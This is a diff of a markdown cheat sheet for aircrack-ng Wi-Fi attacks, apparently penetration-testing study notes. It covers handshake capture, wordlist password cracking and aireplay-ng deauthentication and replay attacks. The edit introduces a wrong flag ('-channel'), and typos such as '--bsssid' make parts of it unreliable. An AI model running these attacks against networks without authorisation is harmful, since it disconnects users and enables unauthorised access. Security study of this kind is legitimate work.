@@ -18,7 +18,7 @@ ifconfig
 #### Don't forget to specify interface
 #### Don't forget to specify channel - otherwise will rotate
 ```
-sudo airodump-ng [interface] --channel [#] --bssid [BSSID] --essid [ESSID] -w [file.cap]
+sudo airodump-ng [interface] -channel [#] --bssid [BSSID] --essid [ESSID] -w [file.cap]
 sudo airodump-ng wlan0mon -c 2
 ```
 |CMD|DESC|
@@ -26,7 +26,7 @@ sudo airodump-ng wlan0mon -c 2
 |-w|output filename| 
 |--bsssid|specific BSSID|
 |--essid|specific client ESSID|
-|--c|channel|
+|-c|channel|
 |-g|GPS|
 |--ivs| Interval Vectors
 |-R|Regular Expression|
@@ -38,22 +38,21 @@ aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.
 aircrack-ng -w /usr/local/share/dict/wordlist-probable.txt -e [essid] -b [bssid] psk.cap
 ```
 ## Aireplay-ng
-#### Set card to channel [#]
 ```
-sudo airmon-ng start wlan0 # 
-```
-### Aireplay Attacks
-```
-sudo aireplay-ng [attack type] [# of deauths] -a [BSSID] -c [clientBSSID] [interface]
+sudo aireplay-ng [attack type] [# of attack] -a [BSSID] -c [clientBSSID] [interface]
 sudo aireplay-ng -0 10 -a 34:08:04:09:3D:38 -c 35:08:04:09:3D:40 wlan0mon
 ```
 |CMD|DESC|
 |-----|-----|
--0 |# deauths
-0 | continuous
--a|BSSID
--c|client MAC
+-0|# deauths
+-1|Fake Authentication
+-2|Interactive Packet REplay
 -3|ARP Replay
+-a|BSSID AP MAC
+-c|Destination MAC
+-h|Source MAC
+-e|ESSID target AP SSID
+
 
 ## WPA/WPA2-PSK
 ```
